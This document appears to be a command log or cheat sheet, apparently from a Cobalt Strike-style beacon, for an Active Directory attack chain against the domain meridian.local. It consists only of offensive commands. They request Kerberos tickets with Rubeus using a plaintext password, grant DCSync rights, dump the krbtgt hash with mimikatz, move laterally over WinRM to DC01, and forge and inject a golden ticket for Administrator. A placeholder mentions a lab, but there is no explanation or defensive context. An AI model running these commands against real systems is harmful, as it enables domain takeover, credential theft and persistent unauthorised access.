shell whoami
execute-assembly C:\tools\Rubeus.exe asktgt /user:awalker /password:Autumn2024!
powershell Add-DomainObjectAcl -TargetIdentity "DC=meridian,DC=local" -PrincipalIdentity awalker -Rights DCSync
execute-assembly C:\tools\mimikatz.exe # lsadump::dcsync /domain:meridian.local /user:krbtgt



jump winrm DC01

execute-assembly Rubeus.exe asktgt /user:awalker /password:Autumn2024!
execute-assembly Rubeus.exe triage
execute-assembly Rubeus.exe asktgs /service:cifs/dc01.meridian.local
execute-assembly Rubeus.exe renew /ticket:awalker.kirbi
execute-assembly Rubeus.exe dump
execute-assembly Rubeus.exe golden /user:Administrator /rc4:<krbtgt hash from lab> /sid:S-1-5-21-3623811015-3361044348-30300820 /ptt
execute-assembly Rubeus.exe triage